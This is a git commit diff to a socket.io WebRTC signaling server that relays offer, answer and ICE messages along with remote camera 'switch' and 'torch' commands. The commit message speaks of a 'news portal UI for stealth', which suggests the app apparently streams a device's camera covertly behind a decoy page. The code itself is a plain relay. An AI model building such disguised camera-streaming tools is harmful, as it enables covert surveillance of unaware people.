5dd5e3e8e8fe3e6b1fd69f4775e93d7527345fd6
roknuzzamanrony25-dev <roknuzzamanrony25@gmail.com>
2026-02-14 17:10:54 +0600

    Added Professional News Portal UI for Stealth

--- server.js
+++ server.js
@@ -10,10 +10,7 @@ io.on("connection", (socket) => {
     socket.on("offer", (data) => socket.broadcast.emit("offer", data));
     socket.on("answer", (data) => socket.broadcast.emit("answer", data));
     socket.on("ice", (data) => socket.broadcast.emit("ice", data));
-    socket.on("switch", (id) => io.to(id).emit("switch"));
-    socket.on("torch", (id) => io.to(id).emit("torch"));
-    socket.on("status", (data) => socket.broadcast.emit("status", { ...data, id: socket.id }));
-    socket.on("disconnect", () => socket.broadcast.emit("user-left", socket.id));
+    socket.on("switch", () => socket.broadcast.emit("switch"));
 });
 
 server.listen(process.env.PORT || 3000, () => console.log("Server Live"));
